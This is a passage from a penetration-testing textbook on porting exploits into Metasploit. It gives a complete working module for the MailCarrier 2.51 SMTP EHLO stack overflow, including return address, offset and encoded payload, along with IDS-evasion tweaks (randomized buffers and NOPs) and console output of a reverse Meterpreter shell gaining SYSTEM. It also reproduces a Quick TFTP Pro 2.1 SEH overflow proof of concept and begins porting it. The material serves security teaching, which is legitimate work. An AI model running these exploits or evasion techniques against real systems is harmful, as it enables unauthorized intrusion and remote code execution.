192.168.1.101</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mailcarrier_book) &gt; <span class="s24">set RHOST 192.168.1.155</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST =&gt; 192.168.1.155</p><p class="s30" style="padding-left: 21pt;text-indent: 0pt;line-height: 12pt;text-align: center;">O  <span class="s25">msf exploit(mailcarrier_book) </span><span class="s51">&gt; </span><span class="s24">set  payload generic/debug_trap</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">payload =&gt; generic/debug_trap</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mailcarrier_book) &gt; <span class="s24">exploit</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Exploit completed, but no session was created. msf exploit(mailcarrier_book) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_594.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 84%;text-align: left;">We set the options as if we were running a normal exploit, except that we use the <span class="s25">generic/debug_trap </span>payload <span class="s32">O </span>to test our exploit.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">After the module runs, the debugger should pause with EIP overwritten</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">by <span class="s19">42424242 </span>as shown in Figure 15-1; if you see a successful EIP overwrite of <span class="s19">42424242</span>, you know your exploit is working. Notice in Figure 15-1 that the EIP register points to 42424242 and that the NOP slide and the dummy pay- load have made it into the buffer as expected.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="438" height="248" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_595.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 15-1: MailCarrier initial overwrite</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark405">Implementing Features of the Framework</a><a name="bookmark422">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Having proved that the basic skeleton of the module works by overwriting our EIP address, we can slowly start to implement the features of the Frame- work. We begin by setting the target return address (shown in bold in the fol- lowing example) in the <span class="s25">&#39;Targets&#39; </span>block to a JMP ESP address. This is the same address that was used in the original exploit; it’s found in <span class="s19">SHELL32.DLL </span>on Windows XP SP2. We need to find a legitimate return address to ensure that our code executes properly on the operating system we are targeting. Remember that some exploits work only on specific operating systems, as is the case with this exploit. We are using an address from <span class="s19">SHELL32.DLL</span>, which will change across different versions or service packs. If we were to find a standard JMP ESP in the application’s memory address, we would not need to use a Windows DLL and could make this exploit universal to all Windows platforms, because the memory addresses would never change.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_596.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Targets&#39; =&gt;</p><p class="s25" style="padding-left: 120pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 120pt;text-indent: 0pt;text-align: left;">],</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 6pt;text-indent: 0pt;text-align: left;">[ &#39;Windows XP SP2 - EN&#39;, { &#39;Ret&#39; =&gt; <span class="s24">0x7d17dd13 </span>} ],</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_597.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Metasploit will add the return address into the exploit at run time. You can replace the return address in the exploit block with <span class="s25">[target[&#39;Ret&#39;]].pack(&#39;V&#39;)</span>. This will insert the target return address into the exploit, reversing the bytes in little-endian format. (The endian-ness is determined by the target CPU’s architecture, and processors that are Intel-compatible use little-endian byte ordering.)</p><p class="s22" style="padding-top: 4pt;padding-left: 90pt;text-indent: -36pt;text-align: justify;">NOTE <span class="s19">If you declared more than one target, this particular line would select the proper return address based on the target you selected when running the exploit. Notice how moving the exploit to the Framework is already adding versatility.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_598.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">sploit = &quot;EHLO &quot;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">sploit &lt;&lt; &quot;\x41&quot; * 5093</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">sploit &lt;&lt; [target[&#39;Ret&#39;]].pack(&#39;V&#39;) sploit &lt;&lt; &quot;\x90&quot; * 32</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">sploit &lt;&lt; &quot;\xcc&quot; * 1000</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_599.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Re-executing the exploit module should result in a successful jump to the INT3 dummy shellcode instructions, as shown in Figure 15-2.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="438" height="282" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_600.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 107%;text-align: left;">Figure 15-2: A successful jump to dummy shellcode; we are at our user control’s INT3 instructions.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark406">Adding Randomization</a><a name="bookmark423">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: right;">Most intrusion detections systems will trigger an alert when they detect a long string of <span class="s19">A</span>s traversing the network, because this is a common buffer pattern for exploits. Therefore, it’s best to introduce as much randomization as possible into your exploits, because doing so will break many exploit-specific signatures.</p><p style="padding-left: 90pt;text-indent: 17pt;text-align: left;">To add randomness to this exploit, edit the <span class="s25">&#39;Targets&#39; </span>section in the super block to include the offset amount required prior to overwriting EIP, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_601.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Targets&#39; =&gt;</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;text-align: left;">],</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 7pt;padding-left: 19pt;text-indent: 0pt;text-align: left;"><span class="s30">O</span>[ &#39;Windows XP SP2 - EN&#39;, { &#39;Ret&#39; =&gt; 0x7d17dd13, <span class="s24">&#39;Offset&#39; =&gt; 5093 </span>} ],</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="501" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_602.png"/></span></p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 18pt;line-height: 89%;text-align: left;">By declaring the <span class="s25">Offset </span>here <span class="s32">O</span>, you will no longer need to include the string of <span class="s19">A</span>s manually in the exploit itself. This is a very useful feature, because in some cases the buffer length will differ across different operating system</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">versions.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We can now edit the exploit section to have Metasploit generate a ran- dom string of uppercase alphabetic characters instead of the 5093 <span class="s19">A</span>s at run- time. From this point on, each run of the exploit will have a unique buffer. (We’ll use <span class="s25">rand_text_alpha_upper </span>to accomplish this, but we aren’t limited to this one engine. To see all available text formats, see the <span class="s19">text.rb </span>file located on Back|Track under <span class="s19">/opt/metasploit/msf3/lib/rex/</span>.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_603.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">sploit = &quot;EHLO &quot;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">sploit &lt;&lt; <span class="s24">rand_text_alpha_upper</span>(target[&#39;Offset&#39;] sploit &lt;&lt; [target[&#39;Ret&#39;]].pack(&#39;V&#39;)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">sploit &lt;&lt; &quot;\x90&quot; * 32 sploit &lt;&lt; &quot;\xcc&quot; * 1000</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_604.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">As you can see, the string of <span class="s19">A</span>s will be replaced with a random string of uppercase alphanumeric characters. And when we run the module again, it still works properly.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark407">Removing the NOP Slide</a><a name="bookmark424">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Our next step is to remove the very obvious NOP slide, because this is another item that often triggers intrusion detection systems. Although <span class="s25">\x90 </span>is the best- known no-operation instruction, it isn’t the only one available. We can use the <span class="s25">make_nops() </span>function to tell Metasploit to use random NOP-equivalent instructions in the module:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_605.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">sploit = &quot;EHLO &quot;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">sploit &lt;&lt; rand_text_alpha_upper(target[&#39;Offset&#39;]) sploit &lt;&lt; [target[&#39;Ret&#39;]].pack(&#39;V&#39;)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sploit &lt;&lt; <span class="s24">make_nops(32)</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">sploit &lt;&lt; &quot;\xcc&quot; * 1000</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_606.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">We run the module again and check our debugger, which should be paused again on the INT3 instructions. The familiar NOP slide has been replaced by seemingly random characters, as shown in Figure 15-3.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark408">Removing the Dummy Shellcode</a><a name="bookmark425">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">With everything in the module working correctly, we can now remove the dummy shellcode. The encoder will exclude the bad characters declared in the module super block.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_607.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">sploit = &quot;EHLO &quot;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">sploit &lt;&lt; rand_text_alpha_upper(target[&#39;Offset&#39;]) sploit &lt;&lt; [target[&#39;Ret&#39;]].pack(&#39;V&#39;)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">sploit &lt;&lt; make_nops(32) sploit &lt;&lt; <span class="s24">payload.encoded</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_608.png"/></span></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="406" height="275" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_609.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 15-3: Randomized MailCarrier buffer</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The <span class="s25">payload.encoded </span>function tells Metasploit to append the indicated payload to the end of the malicious string at run time.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now, when we load our module, set a real payload, and execute it, we should be presented with our hard-earned shell, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_610.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mailcarrier_book) &gt; <span class="s24">set payload windows/meterpreter/reverse_tcp</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp msf exploit(mailcarrier_book) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 192.168.1.101:4444 [*] Sending stage (747008 bytes)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Meterpreter session 1 opened (192.168.1.101:4444 -&gt; 192.168.1.155:1265)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">getuid</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Server username: NT AUTHORITY\SYSTEM meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_611.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark409">Our Completed Module</a><a name="bookmark426">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Just to wrap things up, here is the complete and final code for this Metasploit exploit module:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_612.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">require &#39;msf/core&#39;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 63pt;text-indent: -27pt;text-align: left;">class Metasploit3 &lt; Msf::Exploit::Remote Rank = GoodRanking</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 63pt;text-indent: 0pt;text-align: left;">include Msf::Exploit::Remote::Tcp</p><p class="s25" style="padding-top: 3pt;padding-left: 91pt;text-indent: -27pt;text-align: left;">def initialize(info = {}) super(update_info(info,</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;text-align: left;">&#39;Name&#39; =&gt; &#39;TABS MailCarrier v2.51 SMTP EHLO Overflow&#39;, &#39;Description&#39; =&gt; %q{</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;text-align: left;">This module exploits the MailCarrier v2.51 suite SMTP service. The stack is overwritten when sending an overly long EHLO command.</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 10pt;text-align: left;">},</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Author&#39; =&gt; [ &#39;Your Name&#39; ],</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Arch&#39; =&gt; [ ARCH_X86 ],</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;text-align: left;">&#39;License&#39; =&gt; MSF_LICENSE, &#39;Version&#39; =&gt; &#39;$Revision: 7724 $&#39;, &#39;References&#39; =&gt;</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p class="s25" style="padding-left: 153pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[ &#39;CVE&#39;, &#39;2004-1638&#39; ],</p><p class="s25" style="padding-left: 153pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[ &#39;OSVDB&#39;, &#39;11174&#39; ],</p><p class="s25" style="padding-left: 153pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[ &#39;BID&#39;, &#39;11535&#39; ],</p><p class="s25" style="padding-left: 153pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://www.exploit-db.com/exploits/598%27" class="s34" target="_blank">[ &#39;URL&#39;, </a>&#39;http://www.exploit-db.com/exploits/598&#39; ],</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 11pt;text-align: left;">],</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Privileged&#39; =&gt; true,</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;DefaultOptions&#39; =&gt;</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p class="s25" style="text-indent: 0pt;line-height: 10pt;text-align: center;">&#39;EXITFUNC&#39;     =&gt; &#39;thread&#39;,</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Payload&#39; =&gt;</p><p class="s25" style="padding-left: 153pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 8pt;padding-left: 153pt;text-indent: 0pt;text-align: left;">},</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Space&#39; =&gt; 1000,</p><p class="s25" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">&#39;BadChars&#39; =&gt; &quot;\x00\x0a\x0d\x3a&quot;, &#39;StackAdjustment&#39; =&gt; -3500,</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;text-align: left;">&#39;Platform&#39; =&gt; [&#39;win&#39;], &#39;Targets&#39; =&gt;</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p class="s25" style="padding-left: 153pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[ &#39;Windows XP SP2 - EN&#39;, { &#39;Ret&#39; =&gt; 0x7d17dd13, &#39;Offset&#39; =&gt; 5093 }</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">],</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 11pt;text-align: left;">],</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;DisclosureDate&#39; =&gt; &#39;Oct 26 2004&#39;,</p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;DefaultTarget&#39; =&gt; 0))</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 118pt;text-indent: 0pt;text-align: left;">register_options( [</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p class="s25" style="padding-left: 72pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Opt::RPORT(25),</p><p class="s25" style="padding-left: 72pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Opt::LHOST(), # Required for stack offset</p><p class="s25" style="padding-left: 37pt;text-indent: 0pt;line-height: 11pt;text-align: left;">], self.class)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-left: 67pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def exploit</p><p class="s25" style="padding-left: 91pt;text-indent: 0pt;line-height: 11pt;text-align: left;">connect</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 91pt;text-indent: 0pt;line-height: 11pt;text-align: left;">sploit = &quot;EHLO &quot;</p><p class="s25" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sploit &lt;&lt; rand_text_alpha_upper(target[&#39;Offset&#39;]) sploit &lt;&lt; [target[&#39;Ret&#39;]].pack(&#39;V&#39;)</p><p class="s25" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sploit &lt;&lt; make_nops(32) sploit &lt;&lt; payload.encoded</p><p class="s25" style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">sock.put(sploit + &quot;\r\n&quot;)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">handler disconnect</p><p class="s25" style="padding-left: 67pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_613.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">You’ve just completed your first port of a buffer overflow exploit to Metasploit!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark410">SEH Overwrite Exploit</a><a name="bookmark427">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In our next example, we’ll convert a Structured Exception Handler (SEH) overwrite exploit for Quick TFTP Pro 2.1 to Metasploit. SEH overwrites occur when you overwrite the pointer to the applications exception handler. In this particular exploit, the application triggers an exception, and when it arrives at the pointer over which you have control, you can direct execution flow to your shellcode. The exploit itself is a bit more complex than a simple buffer overflow, but it’s very elegant. In an SEH overwrite, we attempt to bypass the handler that tries to close an application gracefully when a major error or crash occurs.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In the balance of this chapter, we’ll use the <span class="s19">POP-POP-RETN </span>technique to allow us to access our attacker-controlled memory space and gain full code execution. The <span class="s19">POP-POP-RETN </span>technique is commonly used to try to get around the SEH and execute our own code. The first <span class="s19">POP </span>in assembly pulls a memory address from the stack, essentially removing one memory address instruction. The second <span class="s19">POP </span>also pulls a memory address from the stack. The <span class="s19">RETN </span>returns us to a user-controlled area of the code, where we can begin executing our memory instructions.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <a href="http://www.exploit-db.com/download_pdf/" class="s20" target="_blank">To learn more about SEH overwrites, see </a><span class="p">http://www.exploit-db.com/download_pdf/ 10195/</span><span class="s19">.</span></p><p class="s19" style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.exploit-db.com/" class="s31" target="_blank">The Quick TFTP Pro 2.1 exploit was written by Muts. You can find the code for the complete exploit as well as the application at </a>http://www.exploit-db.com/ exploits/5315/<span class="p">. We’ve stripped down the exploit here to make it simpler to port into Metasploit—for example, we’ve stripped out the payload. The remaining skeleton has all of the information we’ll need to use the exploit in Metasploit.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_614.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">#!/usr/bin/python</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"># Quick TFTP Pro 2.1 SEH Overflow (0day) # Tested on Windows XP SP2.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;"># Coded by Mati Aharoni</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;"># muts..at..offensive-security.com</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.offensive-security.com/0day/quick-tftp-poc.py.txt" class="s34" target="_blank"># </a>http://www.offensive-security.com/0day/quick-tftp-poc.py.txt #########################################################</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">import socket import sys</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.offensive-security.com/" class="s34" target="_blank">print &quot;[*] Quick TFTP Pro 2.1 SEH Overflow (0day)&quot; print &quot;[*] http://www.offensive-security.com&quot;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">host = &#39;127.0.0.1&#39;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">port = 69</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">try:</p><p class="s25" style="padding-left: 90pt;text-indent: 16pt;text-align: left;">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) except:</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;text-align: left;">print &quot;socket() failed&quot; sys.exit(1)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">filename = &quot;pwnd&quot; shell = &quot;\xcc&quot; * 317</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;">mode = &quot;A&quot;*1019+&quot;\xeb\x08\x90\x90&quot;+&quot;\x58\x14\xd3\x74&quot;+&quot;\x90&quot;*16+shell muha = &quot;\x00\x02&quot; + filename+ &quot;\0&quot; + mode + &quot;\0&quot;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">print &quot;[*] Sending evil packet, ph33r&quot; s.sendto(muha, (host, port))</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">print &quot;[*] Check port 4444 for bindshell&quot;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_615.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">As we did with our previous JMP ESP example, we first create a skeleton for our new module by using a base example of an exploit similar to the one we used previously:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_616.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">require &#39;msf/core&#39;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">class Metasploit3 &lt; Msf::Exploit::Remote</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 70pt;text-indent: 0pt;line-height: 13pt;text-align: left;">O<span class="s24">include Msf::Exploit::Remote::Udp</span></p><p class="s30" style="padding-left: 70pt;text-indent: 0pt;line-height: 13pt;text-align: left;">8<span class="s24">include Msf::Exploit::Remote::Seh</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 95pt;text-indent: -29pt;text-align: left;">def initialize(info = {}) super(update_info(info,</p><p class="s25" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">&#39;Name&#39; =&gt; &#39;Quick TFTP 